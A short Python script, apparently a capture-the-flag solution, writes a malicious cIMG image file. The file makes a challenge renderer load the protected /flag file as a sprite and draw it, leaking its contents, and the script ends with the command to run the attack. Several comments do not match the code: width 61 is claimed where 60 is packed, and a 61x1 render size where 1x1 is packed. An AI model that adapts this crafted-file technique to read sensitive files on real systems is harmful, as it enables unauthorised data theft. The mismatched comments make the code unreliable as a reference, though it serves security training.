import struct

FLAG_LENGTH = 61  # From ls -la /flag

def create_exploit_cimg():
    # Header - set canvas size to fit entire flag
    header = (
        b'cIMG' +                   # Magic
        struct.pack('<H', 4) +      # Version
        struct.pack('BB', FLAG_LENGTH, 1) +  # Width=61, Height=1
        struct.pack('<I', 2)        # 2 directives
    )
    
    # Malicious handle_5 to load /flag as 61x1 sprite
    payload = (
        b'\x05\x00' +               # Directive 5
        b'\x00' +                   # Sprite ID 0
        struct.pack('BB', FLAG_LENGTH - 1, 1) +  # Width=61, Height=1
        b'/flag' +                  # Absolute path
        b'\x00' * (255 - 5)         # Padding
    )
    
    # handle_4 to render the entire sprite at (0,0)
    payload += (
        b'\x04\x00' +               # Directive 4
        b'\x00' +                   # Sprite ID 0
        b'\xFF\xFF\xFF' +           # White color
        b'\x00\x00' +               # Position (0,0)
        struct.pack('BB', 1, 1) +  # Render size 61x1
        b'\x20'                     # No transparency
    )
    
    with open('flag.cimg', 'wb') as f:
        f.write(header + payload)

if __name__ == '__main__':
    create_exploit_cimg()
    print("Run: /challenge/cimg flag.cimg")
